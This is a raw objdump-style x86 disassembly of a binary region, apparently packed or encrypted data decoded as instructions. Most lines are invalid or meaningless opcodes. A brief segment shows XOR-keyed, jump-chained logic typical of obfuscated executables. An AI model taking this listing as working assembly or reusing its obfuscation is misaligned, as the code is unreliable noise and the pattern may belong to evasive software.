  40a8ae:	push   ds
  40a8af:	es dec ebx
  40a8b1:	cmc    
  40a8b2:	sub    ecx,DWORD PTR [ebp-0x4a]
  40a8b5:	adc    dl,BYTE PTR ds:0x6acfb7c8
  40a8bb:	adc    ch,BYTE PTR [edx-0xe]
  40a8be:	or     eax,0xce7c302b
  40a8c3:	bound  eax,QWORD PTR [ebp+0x4a]
  40a8c6:	push   ds
  40a8c7:	(bad)  
  40a8c8:	into   
  40a8c9:	jmp    0x40a8d3
  40a8cb:	ret    
  40a8cc:	adc    DWORD PTR [esi+0x47],ebx
  40a8cf:	(bad)  
  40a8d0:	in     al,0x96
  40a8d2:	or     al,0x88
  40a8d4:	or     ch,dl
  40a8d6:	call   0x28c6:0x5b6a024d
  40a8dd:	or     bl,BYTE PTR [edi+0x1faa6a07]
  40a8e3:	cmp    al,dl
  40a8e5:	das    
  40a8e6:	mov    DWORD PTR [edi],eax
  40a8e8:	test   eax,0x40e7d55b
  40a8ed:	mov    DWORD PTR [ecx],ecx
  40a8ef:	inc    esi
  40a8f0:	sub    DWORD PTR [esp],0x27c43d97
  40a8f7:	push   eax
  40a8f8:	shl    BYTE PTR [edi-0x78],cl
  40a8fb:	repnz inc ebp
  40a8fd:	xchg   ebx,eax
  40a8fe:	int    0xea
  40a900:	je     0x40a8aa
  40a902:	dec    edx
  40a903:	in     eax,0xca
  40a905:	mov    ah,0x93
  40a907:	sub    al,0xd0
  40a909:	pop    ss
  40a90a:	inc    edx
  40a90b:	ret    0x52fa
  40a90e:	mov    esi,esp
  40a910:	aam    0x49
  40a912:	fwait
  40a913:	mov    esp,DWORD PTR [ebp+0x1a]
  40a916:	mov    eax,ds:0xd244524f
  40a91b:	xchg   ebp,eax
  40a91c:	fistp  QWORD PTR [ebx]
  40a91e:	sub    al,0x9c
  40a920:	sti    
  40a921:	cli    
  40a922:	stc    
  40a923:	outs   dx,DWORD PTR ds:[esi]
  40a924:	push   ebp
  40a925:	xor    DWORD PTR [eax],ecx
  40a927:	pop    edx
  40a928:	mov    ah,0x3d
  40a92a:	dec    ebx
  40a92b:	outs   dx,BYTE PTR ds:[esi]
  40a92c:	loope  0x40a913
  40a92e:	xchg   esp,eax
  40a92f:	std    
  40a930:	aas    
  40a931:	nop
  40a932:	pushf  
  40a933:	(bad)  
  40a935:	cs jmp 0x40a99f
  40a938:	repnz mov ds:0x76a64ca1,eax
  40a93e:	push   eax
  40a93f:	and    bl,BYTE PTR [edx-0x2240349]
  40a945:	mov    dh,0x6b
  40a947:	jno    0x40a9c1
  40a949:	in     al,dx
  40a94a:	(bad)  
  40a94b:	int3   
  40a94c:	cmp    al,0x6b
  40a94e:	jmp    0x40a9ce
  40a950:	dec    edi
  40a951:	pop    ebp
  40a952:	(bad)
  40a955:	adc    eax,0xc54fe4f2
  40a95a:	add    al,dh
  40a95c:	push   0xe7d37a04
  40a961:	scas   eax,DWORD PTR es:[edi]
  40a962:	cs ins DWORD PTR es:[edi],dx
  40a964:	mov    esi,0xa212c2ee
  40a969:	pushfw 
  40a96b:	hlt    
  40a96c:	lods   eax,DWORD PTR ds:[esi]
  40a96d:	addr16 test eax,0x8ebefb43
  40a974:	ds popa 
  40a976:	pop    eax
  40a977:	nop
  40a978:	jmp    0x40a9ba
  40a97a:	or     al,0x60
  40a97c:	mov    al,ds:0xc6e668ac
  40a981:	push   0xa46ad4b
  40a986:	pop    ebx
  40a987:	aam    0xdf
  40a989:	(bad)  
  40a98a:	jecxz  0x40a99a
  40a98c:	xor    dh,BYTE PTR [edx+0x248b9711]
  40a992:	test   BYTE PTR [edx+edx*1-0x16c17a5f],bl
  40a999:	push   ebx
  40a99a:	scas   al,BYTE PTR es:[edi]
  40a99b:	sub    edi,DWORD PTR [edx]
  40a99d:	sbb    eax,0x3604e0a5
  40a9a2:	xchg   ecx,eax
  40a9a3:	popa   
  40a9a4:	iret   
  40a9a5:	dec    edi
  40a9a6:	mov    WORD PTR es:[eax-0x38],ss
  40a9aa:	push   ebp
  40a9ab:	dec    ebx
  40a9ac:	int3   
  40a9ad:	fcmovnu st,st(4)
  40a9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9b0:	mov    eax,0xbf302b2f
  40a9b5:	inc    esi
  40a9b6:	clc    
  40a9b7:	popa   
  40a9b8:	mov    eax,ds:0x694da8a3
  40a9bd:	cmp    al,0x66
  40a9bf:	and    eax,DWORD PTR [edx+ecx*2+0x523f019]
  40a9c6:	adc    al,0x27
  40a9c8:	mov    dh,0x7e
  40a9ca:	add    eax,0x257b549b
  40a9cf:	xchg   ecx,eax
  40a9d0:	push   eax
  40a9d1:	stos   BYTE PTR es:[edi],al
  40a9d2:	fidivr WORD PTR [edx-0x6d]
  40a9d5:	cmp    BYTE PTR [edx+0x2eb5cbac],al
  40a9db:	dec    edi
  40a9dc:	adc    edx,ebp
  40a9de:	mov    bh,0x80
  40a9e0:	dec    eax
  40a9e1:	aad    0xc0
  40a9e3:	pop    ds
  40a9e4:	stc    
  40a9e5:	pop    esi
  40a9e6:	mov    al,0xa5
  40a9e8:	scas   eax,DWORD PTR es:[edi]
  40a9e9:	imul   edx,DWORD PTR [eax+ebx*8],0x49
  40a9ed:	fcom   st(2)
  40a9ef:	cmp    BYTE PTR [edx+edx*1+0x65],bl
  40a9f3:	fadd   st,st(2)
  40a9f5:	scas   al,BYTE PTR es:[edi]
  40a9f6:	and    eax,0xeb5e258
  40a9fb:	mov    ss,WORD PTR [edx+0x7aad0b4]
  40aa01:	test   eax,0xb2952cbc
  40aa06:	xor    eax,0x2221e380
  40aa0b:	icebp  
  40aa0c:	mov    al,BYTE PTR [esi]
  40aa0e:	xchg   edi,eax
  40aa0f:	push   esi
  40aa10:	cmpxchg esp,eax
  40aa13:	mov    ah,bl
  40aa15:	inc    esi
  40aa16:	dec    ebp
  40aa17:	push   ebx
  40aa18:	and    al,0xd6
  40aa1a:	or     eax,0xc56c710b
  40aa1f:	test   edi,esi
  40aa21:	dec    ebp
  40aa22:	or     al,0xb6
  40aa24:	jmp    0x67c84409
  40aa29:	sub    BYTE PTR [eax],dh
  40aa2b:	(bad)  
  40aa2c:	adc    eax,0x8060eaa2
  40aa31:	or     ebp,edx
  40aa33:	mov    al,ds:0x2b417ffc
  40aa38:	jmp    0x40a9ff
  40aa3a:	xor    al,0xe2
  40aa3c:	loopne 0x40aa7e
  40aa3e:	addr16 inc esi
  40aa40:	aas    
  40aa41:	dec    esp
  40aa42:	sti    
  40aa43:	int3   
  40aa44:	imul   esi,DWORD PTR [ecx-0x16785c05],0xa91dd6d0
  40aa4e:	cmp    ebp,DWORD PTR [esi-0x7c]
  40aa51:	das    
  40aa52:	pop    es
  40aa53:	push   cs
  40aa54:	mov    ds:0x57478c65,eax
  40aa59:	pop    ebx
  40aa5a:	addr16 jl 0x40aa4d
  40aa5d:	sub    al,0xc8
  40aa5f:	repz or DWORD PTR [ecx-0x7e5fb862],ebp
  40aa66:	inc    ecx
  40aa67:	and    al,0xb6
  40aa6a:	mov    ebp,0x2992901e
  40aa6f:	shl    ecx,0x67
  40aa72:	dec    edi
  40aa73:	mov    BYTE PTR [edi+0x5d387d65],al
  40aa79:	sub    ah,al
  40aa7b:	mov    ds:0xfee03aad,al
  40aa80:	popf   
  40aa81:	add    al,0xbb
  40aa83:	dec    edi
  40aa84:	and    edx,0xc2d5d604
  40aa8a:	cmp    BYTE PTR [edx],ah
  40aa8c:	jg     0x40aa6e
  40aa8e:	sub    ecx,DWORD PTR [ebp-0x25b25fc9]
  40aa94:	jnp    0x40aaaa
  40aa96:	pop    esi
  40aa97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa98:	stos   DWORD PTR es:[edi],eax
  40aa99:	test   al,0x40
  40aa9b:	inc    eax
  40aa9c:	fdiv   QWORD PTR [ecx]
  40aa9e:	xor    edx,DWORD PTR [ecx+0x782bed26]
  40aaa4:	imul   eax,DWORD PTR [ebx-0x2c],0x68
  40aaa8:	and    eax,0x452b2405
  40aaad:	stos   DWORD PTR es:[edi],eax
  40aaae:	les    edx,FWORD PTR [edi+0x17]
  40aab1:	ja     0x40aaba
  40aab3:	sub    BYTE PTR [edx-0x2e177cde],0x25
  40aaba:	test   DWORD PTR [ebp+0x56],ebx
  40aabd:	jg     0x40aada
  40aabf:	pushf  
  40aac0:	mov    ebp,0xd42c8f01
  40aac5:	loopne 0x40ab2a
  40aac7:	jle    0x40ab3a
  40aac9:	xor    dh,BYTE PTR [ecx+esi*4-0xcc1229]
  40aad0:	sub    DWORD PTR [edx],edi
  40aad2:	sbb    DWORD PTR ds:0xaca719ca,ecx
  40aad8:	lahf   
  40aad9:	leave  
  40aada:	aaa    
  40aadb:	sar    BYTE PTR [eax+0x28],0x95
  40aadf:	je     0x40ab0b
  40aae1:	jp     0x40aa68
  40aae3:	test   DWORD PTR [ecx],ebp
  40aae5:	xchg   ecx,eax
  40aae6:	nop
  40aae7:	xchg   edi,eax
  40aae8:	rol    esi,1
  40aaea:	js     0x40aaac
  40aaec:	ins    BYTE PTR es:[edi],dx
  40aaed:	add    cl,BYTE PTR [ebx+0x27a4985f]
  40aaf3:	xor    al,0xa2
  40aaf5:	adc    BYTE PTR [edi-0x9],bl
  40aaf8:	(bad)  
  40aaf9:	cli    
  40aafa:	dec    ebx
  40aafb:	xchg   esp,eax
  40aafc:	imul   edi,DWORD PTR [ebx-0x74],0x9
  40ab00:	es ins DWORD PTR es:[edi],dx
  40ab02:	xor    eax,0xdbb4b18f
  40ab07:	daa    
  40ab08:	mov    ebp,0x8bd89e65
  40ab0d:	mov    bl,0x50
  40ab0f:	sbb    DWORD PTR ds:0x12bd276f,ebx
  40ab15:	mov    dl,0x1
  40ab17:	das    
  40ab18:	xchg   BYTE PTR [ebp+0x68],al
  40ab1b:	adc    edx,ecx
  40ab1d:	jae    0x40ab24
  40ab1f:	out    0x83,al
  40ab21:	loopne 0x40ab25
  40ab23:	repnz mov dh,0x36
  40ab26:	ret    
  40ab27:	inc    eax
  40ab28:	out    0x4b,eax
  40ab2a:	mov    WORD PTR [edi+0x5ec1560b],?
  40ab30:	shl    DWORD PTR [esi-0x5b],1
  40ab33:	rcr    edx,1
  40ab35:	jle    0x40ab49
  40ab37:	dec    edi
  40ab38:	sub    eax,0xa1d4f55e
  40ab3d:	call   0xf00d:0x1799c305
  40ab44:	mov    esi,eax
  40ab46:	mov    BYTE PTR [esi+ebp*8],al
  40ab49:	je     0x40ab95
  40ab4b:	ret    
  40ab4c:	or     esi,edi
  40ab4e:	ficom  WORD PTR [eax-0x1ce8a731]
  40ab54:	and    esp,edi
  40ab56:	mov    ch,BYTE PTR [ecx-0x45]
  40ab59:	(bad)  
  40ab5a:	call   0x2fd4108
  40ab5f:	in     eax,dx
  40ab60:	or     al,0x4f
  40ab62:	cmp    bh,BYTE PTR [ecx-0x79c78e0]
  40ab68:	inc    ecx
  40ab69:	sub    esi,DWORD PTR [ebx-0x27]
  40ab6c:	sub    ebp,ebx
  40ab6e:	jle    0x40abdf
  40ab70:	outs   dx,DWORD PTR ds:[esi]
  40ab71:	call   0x233c03c2
  40ab76:	pop    es
  40ab77:	in     al,0xdb
  40ab79:	mov    ch,0xf4
  40ab7b:	push   0xffffffd0
  40ab7d:	je     0x40abe2
  40ab7f:	adc    eax,0x4edf7108
  40ab84:	mov    eax,ds:0x3e1aebaf
  40ab89:	xor    BYTE PTR [ebx+0x24f02b68],dl
  40ab8f:	pop    ebx
  40ab90:	inc    edx
  40ab91:	out    dx,eax
  40ab92:	push   edi
  40ab93:	xor    eax,0x8130206e
  40ab98:	(bad)  
  40ab9c:	mov    esi,0xcefe5650
  40aba1:	push   ss
  40aba2:	sahf   
  40aba3:	sub    bl,cl
  40aba5:	fld1   
  40aba7:	and    eax,0xb9c8229d
  40abac:	mov    al,0x41
  40abae:	or     edi,DWORD PTR [esi-0x785e70aa]
  40abb4:	xchg   esp,eax
  40abb5:	add    DWORD PTR [esi+eiz*2+0xdc425a5],edi
  40abbc:	(bad)  
  40abbd:	cmp    edx,DWORD PTR [bx]
  40abc0:	pop    es
  40abc1:	add    eax,DWORD PTR [ecx]
  40abc3:	mov    edx,DWORD PTR [ebp+0x25]
  40abc6:	fsub   QWORD PTR [ebp+eax*8-0x7a]
  40abca:	mov    edx,0xbc832403
  40abcf:	push   0x5dd30731
  40abd4:	pop    eax
  40abd5:	pop    ebp
  40abd6:	dec    edi
  40abd7:	adc    BYTE PTR ds:0xc2b7c33c,bl
  40abdd:	sub    eax,0x3e7d507d
  40abe2:	dec    edi
  40abe3:	or     eax,0x5bca027d
  40abe8:	push   esp
  40abe9:	test   eax,esp
  40abeb:	das    
  40abec:	imul   bx,WORD PTR [ecx],0xffc2
  40abf0:	scas   eax,DWORD PTR es:[edi]
  40abf1:	js     0x40ac4f
  40abf3:	icebp  
  40abf4:	stos   BYTE PTR es:[edi],al
  40abf5:	jge    0x40ab9c
  40abf7:	aam    0x30
  40abf9:	fidivr DWORD PTR [edi-0x39]
  40abfc:	pusha  
  40abfd:	sbb    ebx,ecx
  40abff:	ret    
  40ac00:	das    
  40ac01:	jo     0x40ac6e
  40ac03:	inc    ebp
  40ac04:	lahf   
  40ac05:	sub    ebp,ecx
  40ac07:	rol    DWORD PTR [ebx+0x53],cl
  40ac0a:	bswap  esi
  40ac0c:	mov    eax,0x6fcb4f72
  40ac11:	jmp    0x40abb8
  40ac13:	inc    ebp
  40ac14:	in     eax,0x4a
  40ac16:	cmp    DWORD PTR [edx-0x56],esi
  40ac19:	dec    edx
  40ac1a:	addr16 in eax,0xa3
  40ac1d:	inc    edi
  40ac1e:	xchg   BYTE PTR [ecx-0x2c],bl
  40ac21:	pop    edx
  40ac22:	inc    esi
  40ac23:	push   ebx
  40ac24:	fld    DWORD PTR [ebx]
  40ac26:	add    BYTE PTR [esi+0x18],dl
  40ac29:	addr16 pop edx
  40ac2b:	mov    ebp,0x9e90834e
  40ac30:	les    ecx,FWORD PTR [eax+0x531650c2]
  40ac36:	xor    eax,0x6ba32736
  40ac3b:	nop
  40ac3c:	jbe    0x40ac9b
  40ac3e:	fisttp QWORD PTR [esi]
  40ac40:	cmp    al,0x34
  40ac42:	gs pop esp
  40ac44:	dec    esi
  40ac45:	mov    fs,WORD PTR [ebp+esi*8-0x5e]
  40ac49:	and    eax,0x213d7f73
  40ac4e:	fisub  WORD PTR [ebx]
  40ac50:	add    al,0xe9
  40ac52:	inc    ebp
  40ac53:	fisttp WORD PTR [edx-0x4e9975f7]
  40ac59:	sbb    bh,BYTE PTR [ebx+0x74]
  40ac5c:	inc    ebp
  40ac5d:	add    edi,0x4b4f8027
  40ac63:	jb     0x40ace2
  40ac65:	out    0xe0,eax
  40ac67:	jg     0x40acdc
  40ac69:	clc    
  40ac6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac6b:	fdivr  QWORD PTR [edx+0xf]
  40ac6e:	xchg   edx,eax
  40ac6f:	in     al,0x7e
  40ac71:	stos   BYTE PTR es:[edi],al
  40ac72:	lods   al,BYTE PTR ds:[esi]
  40ac73:	and    ecx,edi
  40ac75:	cmc    
  40ac76:	out    0xad,eax
  40ac78:	inc    ebx
  40ac79:	dec    ebp
  40ac7a:	mov    bl,0x32
  40ac7c:	test   BYTE PTR [esi+0x41bd1d0f],bl
  40ac82:	xor    bl,BYTE PTR [eax+ebp*8+0x26]
  40ac86:	arpl   WORD PTR [ebx+0x7c],di
  40ac89:	test   eax,0x1674e557
  40ac8e:	das    
  40ac8f:	lahf   
  40ac90:	and    eax,0x61d85bfb
  40ac95:	jnp    0x40acd3
  40ac97:	outs   dx,BYTE PTR ds:[esi]
  40ac98:	fsub   st(4),st
  40ac9a:	xchg   DWORD PTR [edi+0x12],edi
  40ac9d:	ss cs pop eax
  40aca0:	pushf  
  40aca1:	mov    WORD PTR [esi],?
  40aca3:	arpl   WORD PTR [ecx],sp
  40aca5:	add    al,0x26
  40aca7:	cli    
  40aca8:	enter  0x8980,0x8a
  40acac:	cmp    ah,BYTE PTR ss:[ebp+0x15]
  40acb0:	pop    es
  40acb1:	movd   mm5,DWORD PTR [edx]
  40acb4:	jge    0x40aca2
  40acb6:	mov    ecx,0xf6be79be
  40acbb:	jg     0x40acc2
  40acbd:	leave  
  40acbe:	cwde   
  40acbf:	rcl    eax,0xe0
  40acc2:	popa   
  40acc3:	or     eax,ecx
  40acc5:	rcl    DWORD PTR [ecx-0x4c7c2ce2],1
  40accb:	cmp    bl,BYTE PTR [ecx-0x75]
  40acce:	(bad)  
  40accf:	clc    
  40acd0:	in     eax,0x41
  40acd2:	cdq    
  40acd3:	fisubr DWORD PTR [esi]
  40acd5:	add    al,0x46
  40acd7:	test   BYTE PTR [edi+0x2bc0a1bc],bl
  40acdd:	add    ebp,esp
  40acdf:	add    dh,ch
  40ace1:	cli    
  40ace2:	retf   
  40ace3:	or     ecx,ebp
  40ace5:	clc    
  40ace6:	hlt    
  40ace7:	xor    cl,al
  40ace9:	adc    ch,dl
  40aceb:	leave  
  40acec:	sub    eax,0xd633b3e3
  40acf1:	lea    edx,[ecx+eax*2+0x45]
  40acf5:	outs   dx,BYTE PTR ds:[esi]
  40acf6:	push   ds
  40acf7:	mov    BYTE PTR [ebx-0x2779dac4],ah
  40acfd:	jne    0x40acfe
  40acff:	push   ecx
  40ad00:	xchg   ebp,eax
  40ad01:	pop    ecx
  40ad02:	(bad)  
  40ad03:	into   
  40ad04:	jbe    0x40acdb
  40ad06:	push   edx
  40ad07:	lea    ebx,ds:0x7328cf3f
  40ad0d:	repz je 0x40acbf
  40ad10:	adc    al,0x90
  40ad12:	dec    edi
  40ad13:	pushf  
  40ad14:	cs add dh,bh
  40ad17:	ror    BYTE PTR [ebx+ecx*8-0x4c],cl
  40ad1b:	xor    bl,ah
  40ad1d:	pmovmskb ecx,mm0
  40ad20:	scas   al,BYTE PTR es:[edi]
  40ad21:	add    DWORD PTR [ebp+0x5d21917c],0x261a42d5
  40ad2b:	inc    edx
  40ad2c:	jl     0x40ad37
  40ad2e:	je     0x40ada1
  40ad30:	fnstcw WORD PTR es:[esp+eax*8+0xe64d80b]
  40ad38:	idiv   DWORD PTR [ebp+0x16d31a8d]
  40ad3e:	pop    ds
  40ad3f:	retf   0xd162
  40ad42:	call   0x32d6:0xf535b268
  40ad49:	dec    eax
  40ad4a:	je     0x40ad69
  40ad4c:	xor    al,0x8d
  40ad4e:	add    BYTE PTR [edx-0x160946c3],bl
  40ad54:	outs   dx,DWORD PTR ds:[esi]
  40ad55:	ror    BYTE PTR [edx],cl
  40ad57:	mov    ebx,0x8986f4df
  40ad5c:	aam    0xdd
  40ad5e:	mov    ebx,0x8f5c2cbc
  40ad63:	popf   
  40ad64:	mov    ds:0x4e5e7300,al
  40ad69:	pop    esi
  40ad6a:	cmp    esi,DWORD PTR [ebx+ebx*2+0x62]
  40ad6e:	xchg   ebx,eax
  40ad6f:	retf   
  40ad70:	(bad)  
  40ad71:	cmp    al,0x7a
  40ad73:	repnz rol cx,1
  40ad77:	xor    eax,0x79ce1d4f
  40ad7c:	xchg   ecx,eax
  40ad7d:	int3   
  40ad7e:	mov    bl,0xab
  40ad80:	popa   
  40ad81:	out    0xb8,al
  40ad83:	dec    edx
  40ad84:	inc    esi
  40ad85:	rcl    BYTE PTR [edi-0x7],1
  40ad88:	pushf  
  40ad89:	jg     0x40adad
  40ad8b:	stos   DWORD PTR es:[edi],eax
  40ad8c:	fcmovnb st,st(6)
  40ad8e:	and    esp,DWORD PTR [ecx-0x1e]
  40ad91:	loop   0x40adcd
  40ad93:	push   0x7c
  40ad95:	ins    BYTE PTR es:[edi],dx
  40ad96:	ja     0x40ad2d
  40ad98:	cmp    ch,BYTE PTR [ecx+eiz*8]
  40ad9b:	mov    esi,0xc4afa8a
  40ada0:	adc    al,0xe4
  40ada2:	and    al,0x28
  40ada4:	dec    edx
  40ada5:	push   ds
  40ada6:	sub    eax,0xe7228d55
  40adab:	repz dec esp
  40adad:	fs sbb eax,0x31e6ea67
  40adb3:	mov    esp,0x16cb44d7
  40adb8:	popf   
  40adb9:	sbb    dl,BYTE PTR [esi-0x13]
  40adbc:	dec    eax
  40adbd:	out    dx,eax
  40adbe:	mov    ds:0xa48207c9,eax
  40adc3:	xchg   esp,eax
  40adc4:	gs arpl di,di
  40adc7:	ret    
  40adc8:	outs   dx,BYTE PTR ds:[esi]
  40adc9:	mov    al,0xe7
  40adcb:	shr    BYTE PTR [esi-0x4f7780b7],0xbc
  40add2:	(bad)  
  40add3:	push   cs
  40add4:	push   0x37
  40add6:	outs   dx,BYTE PTR ds:[esi]
  40add7:	mov    cl,0x57
  40add9:	test   BYTE PTR [esi-0x5],cl
  40addc:	mov    edi,0x741480f5
  40ade1:	test   cl,0xd
  40ade4:	in     al,0xf7
  40ade6:	sub    ebp,0xfbf79b72
  40adec:	fwait
  40aded:	fs add al,cl
  40adf0:	xchg   ebp,eax
  40adf1:	dec    edx
  40adf2:	es dec eax
  40adf4:	mov    eax,0x19f3e44a
  40adf9:	aad    0xf8
  40adfb:	sbb    ebp,DWORD PTR [ecx+0x55]
  40adfe:	sub    al,0x73
  40ae00:	mov    bh,BYTE PTR [ecx]
  40ae02:	ret    0x18d1
  40ae05:	jle    0x40ae3c
  40ae07:	jle    0x40ae30
  40ae09:	rol    ebx,1
  40ae0b:	push   es
  40ae0c:	adc    ecx,eax
  40ae0e:	in     al,0x50
  40ae10:	sbb    ecx,DWORD PTR [esi+esi*2+0x35]
  40ae14:	aas    
  40ae15:	jge    0x40ae07
  40ae17:	push   edi
  40ae18:	mov    bh,0xde
  40ae1a:	imul   esi,esi,0x252e46d3
  40ae20:	fistp  WORD PTR [edi+0x413cade7]
  40ae26:	inc    eax
  40ae27:	xlat   BYTE PTR ds:[ebx]
  40ae28:	(bad)  
  40ae29:	sbb    eax,0x13ee6065
  40ae2e:	psrlw  mm0,QWORD PTR [ebx]
  40ae31:	jmp    DWORD PTR [esi*2+0x41df3754]
  40ae38:	inc    edi
  40ae39:	jmp    DWORD PTR [ebp+eax*8-0x66b39403]
  40ae40:	jo     0x40ae2d
  40ae42:	repnz or DWORD PTR [edi+ebp*4+0x3c756acb],edi
  40ae4a:	and    eax,0x8dd77b60
  40ae4f:	mov    esi,0x9183a771
  40ae54:	cli    
  40ae55:	loopne 0x40ae5c
  40ae57:	mov    ch,0x64
  40ae59:	call   0x8ee6:0xa3a77e1c
  40ae60:	mov    bl,0x40
  40ae62:	popf   
  40ae63:	lahf   
  40ae64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae65:	sub    ebx,eax
  40ae67:	adc    esp,DWORD PTR [edx+0x5fe72ad7]
  40ae6d:	push   cs
  40ae6e:	adc    al,0xe4
  40ae70:	test   eax,0x7507e9c9
  40ae75:	div    BYTE PTR [ecx+0x79]
  40ae78:	aas    
  40ae79:	push   ss
  40ae7a:	lods   al,BYTE PTR ds:[esi]
  40ae7b:	(bad)  
  40ae7d:	inc    ecx
  40ae7e:	cmp    edx,DWORD PTR [ecx]
  40ae80:	jmp    0x40aeed
  40ae82:	push   ds
  40ae83:	dec    ebx
  40ae84:	cld    
  40ae85:	aaa    
  40ae86:	jbe    0x40aef2
  40ae88:	fcmove st,st(0)
  40ae8a:	(bad)  
  40ae8b:	addr16 or bh,bh
  40ae8e:	and    eax,0xcbe94810
  40ae93:	pop    esp
  40ae94:	sub    BYTE PTR [eax-0x34e9c0f8],ah
  40ae9a:	ins    DWORD PTR es:[edi],dx
  40ae9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9c:	mov    ebp,0x5da3a06e
  40aea1:	retf   
  40aea2:	fnsetpm(287 only) 
  40aea4:	and    bl,BYTE PTR [esi]
  40aea6:	repz rcl dl,0x70
  40aeaa:	mov    ebp,0x5804b70f
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx+0x5a2fa730],al
  40aef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aef7:	test   DWORD PTR [edx+0x137b7b09],eax
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	jo     0x40aec9
  40af02:	rcr    ebx,0x46
  40af05:	dec    eax
  40af06:	popa   
  40af07:	xor    DWORD PTR [ebx],0xfffffff0
  40af0a:	fistp  DWORD PTR [ebx+ebp*8]
  40af0d:	mov    cs,WORD PTR [edx-0x44]
  40af10:	pop    ecx
  40af11:	call   0x1ac0:0x39163e85
  40af18:	push   es
  40af19:	cld    
  40af1a:	jns    0x40aefd
  40af1c:	outs   dx,BYTE PTR ds:[esi]
  40af1d:	(bad)  
  40af1e:	repz repnz xor bh,BYTE PTR [ecx+0x45]
  40af23:	call   0x85e:0x6553c595
  40af2a:	lahf   
  40af2b:	aaa    
  40af2c:	xor    ebx,DWORD PTR ds:[edi]
  40af2f:	bound  edx,QWORD PTR [ebp-0x45a6927d]
  40af35:	sbb    BYTE PTR [edi],dl
  40af37:	mov    ds:0x24456f68,al
  40af3c:	push   esi
  40af3d:	xchg   edi,eax
  40af3e:	dec    edi
  40af3f:	nop
  40af40:	inc    ebx
  40af41:	gs cmp al,0x66
  40af44:	mov    edi,0xf7a7c6a1
  40af49:	div    BYTE PTR [edi+0x228391b5]
  40af4f:	dec    edi
  40af50:	loope  0x40af06
  40af52:	into   
  40af53:	ror    esi,0xe6
  40af56:	cmp    cl,0x19
  40af59:	add    BYTE PTR ds:0x2eb603b7,cl
  40af5f:	pop    ebx
  40af60:	je     0x40af69
  40af62:	push   edx
  40af63:	jle    0x40af80
  40af65:	sbb    BYTE PTR [edx+esi*2],bh
  40af68:	xchg   edi,eax
  40af69:	cli    
  40af6a:	adc    DWORD PTR [edi-0x72d45dc],esp
  40af70:	sub    esp,DWORD PTR [eax+0xfc4ab74]
  40af76:	imul   esp,DWORD PTR [ebx+0x7b60fd99],0xb4c9fe52
  40af80:	fwait
  40af81:	test   edi,0xf3f1a73b
  40af87:	arpl   WORD PTR [ebx+ecx*8-0x80],si
  40af8b:	sub    al,0x99
  40af8d:	xchg   esi,eax
  40af8e:	cli    
  40af8f:	sar    BYTE PTR [esi+0x375b711f],cl
  40af95:	lahf   
  40af96:	sub    BYTE PTR [edx-0x27],cl
  40af99:	and    ebp,edi
  40af9b:	(bad)  
  40af9c:	ins    BYTE PTR es:[edi],dx
  40af9d:	push   es
  40af9e:	sub    BYTE PTR fs:[ebp-0x2184333],dl
  40afa5:	ins    DWORD PTR es:[edi],dx
  40afa6:	popa   
  40afa7:	mov    dl,0x8b
  40afa9:	pop    ecx
  40afaa:	(bad)  
  40afac:	cdq    
  40afad:	ds (bad) 
  40afb0:	imul   ebp,DWORD PTR [ecx-0x6a],0x2e
  40afb4:	jmp    0x103f66ad
  40afb9:	shl    BYTE PTR [edx+0x38],0x9c
  40afbd:	lods   eax,DWORD PTR ds:[esi]
  40afbe:	stos   DWORD PTR es:[edi],eax
  40afbf:	push   esp
  40afc0:	popa   
  40afc1:	cmp    ecx,ebx
  40afc3:	mov    edi,0x33fe0c69
  40afc8:	ja     0x40afea
  40afca:	xor    al,0x7b
  40afcc:	lods   eax,DWORD PTR ds:[esi]
  40afcd:	loopne 0x40af56
  40afcf:	cmp    cl,BYTE PTR ds:0xb6fda74a
  40afd5:	ret    
  40afd6:	(bad)  
  40afd7:	je     0x40afec
  40afd9:	aaa    
  40afda:	arpl   WORD PTR [ecx],dx
  40afdc:	xor    al,0xca
  40afde:	push   esi
  40afdf:	or     ecx,ebx
  40afe1:	mov    ecx,0xea659616
  40afe6:	jle    0x40af75
  40afe8:	jecxz  0x40af8b
  40afea:	or     edi,ecx
  40afec:	rcl    BYTE PTR [edx],0x76
  40afef:	or     eax,0x3f942493
  40aff4:	jl     0x40b05a
  40aff6:	inc    esp
  40aff7:	dec    edi
  40aff8:	sub    eax,0x8c93cef6
  40affd:	mov    esp,0x5d27dbb6
  40b002:	out    0x9c,al
  40b004:	or     ebx,DWORD PTR [edi]
  40b006:	fld    TBYTE PTR [edi-0x4e]
  40b009:	sub    BYTE PTR [edi+edx*4],al
  40b00c:	mov    dh,0x89
  40b00e:	inc    edi
  40b00f:	mov    esi,0x10f86bba
  40b014:	xchg   esi,eax
  40b015:	aas    
  40b016:	dec    BYTE PTR [esi-0x54]
  40b019:	or     al,0x46
  40b01b:	(bad)  
  40b01d:	cmp    BYTE PTR [eax+0x716d9e79],0xe0
  40b024:	scas   eax,DWORD PTR es:[edi]
  40b025:	jle    0x40afb3
  40b027:	shl    DWORD PTR [edx],0xf2
  40b02a:	jp     0x40b0a0
  40b02c:	rcl    ebx,cl
  40b02e:	arpl   WORD PTR [ebp-0x2d],bx
  40b031:	in     al,0x4b
